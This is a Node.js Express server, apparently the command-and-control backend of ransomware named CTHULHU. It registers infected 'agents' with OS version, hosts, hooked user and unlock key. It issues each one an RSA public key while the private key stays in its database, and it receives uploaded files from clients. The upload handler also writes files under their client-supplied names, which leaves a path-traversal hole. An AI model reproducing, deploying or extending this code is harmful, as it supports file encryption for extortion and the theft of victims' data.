const express = require('express');
const mysql = require('mysql');
const util = require("util");
const multer = require("multer");
const crypto = require("crypto");
const fs = require('fs');
const maxSize = 2 * 1024 * 1024;

try {
  const folderName = "/CTHULHU/users"
  if (!fs.existsSync(folderName)) {
    fs.mkdirSync(folderName);
  }
} catch (err) {
  console.log(err)
}

const app = express();
const port = 5000;


app.use(express.json()) // for parsing application/json

// Set up MySQL connection
// change the cread to your own
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_MAIN
});

// Connect to MySQL
db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database: ' + err.stack);
    return;
  }
  console.log('Connected to MySQL database as ID ' + db.threadId);
});

let storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "/CTHULHU/");
  },
  filename: (req, file, cb) => {
    console.log(file.originalname);
    cb(null, file.originalname);
  },
});

let uploadFile = multer({
  storage: storage,
  limits: { fileSize: maxSize },
}).single("file");

let uploadFileMiddleware = util.promisify(uploadFile);

// API endpoint for receiving data
app.post('/api/agent/new', (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  if (
    req.body != undefined &&
    req.body.versionOS != undefined &&
    req.body.hosts != undefined &&
    req.body.hookUser != undefined &&
    req.body.unlockKey != undefined
  ) {

    // Generate RSA key pair
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem'
      }
    });

    const publicKeyStr = publicKey.toString();

    // Insert data into MySQL
    const sql = `INSERT INTO agent (versionOS, hosts, hookUser, unlockKey, privKey, pubKey) VALUES (?, ?, ?, ?, ?, ?)`;
    const values = [req.body.versionOS, req.body.hosts, req.body.hookUser, req.body.unlockKey, privateKey.toString(), publicKeyStr];

    // Insert data into MySQL without keys
    db.query(sql, values, (err, result) => {
      if (err) {
        JSON_RES.error = { errorMsg: "Error inserting data into MySQL " + err.stack }
        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }
      console.log('Inserted data into MySQL with ID ' + result.insertId);
      JSON_RES.data = { id: result.insertId, publicKey: publicKeyStr }

      try {
        const folderName = "/CTHULHU/users" + result.insertId
        if (!fs.existsSync(folderName)) {
          fs.mkdirSync(folderName);
        }
      } catch (err) {
        JSON_RES.error = { errorMsg: err }

        res.status(500)
        res.json(JSON_RES);
        res.end();
        return;
      }

      res.status(200)
      res.json(JSON_RES);
      res.end();
    });

  } else {
    JSON_RES.error = { errorMsg: "Bad parameters" }
    res.status(400)
    res.json(JSON_RES);
    res.end();
  }

});

// API endpoint for receiving files
app.post('/api/file/upload', async (req, res) => {
  var JSON_RES = { data: {}, error: {} }
  try {
    await uploadFileMiddleware(req, res);
    if (req.file == undefined) {
      return res.status(400).send({ message: "Upload a file please!" });
    }
    res.status(200).send({
      message: "The following file was uploaded successfully: " + req.file.originalname,
    });
  } catch (err) {
    res.status(500).send({
      message: `Unable to upload the file: ${req.file.originalname}. ${err}`,
    });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});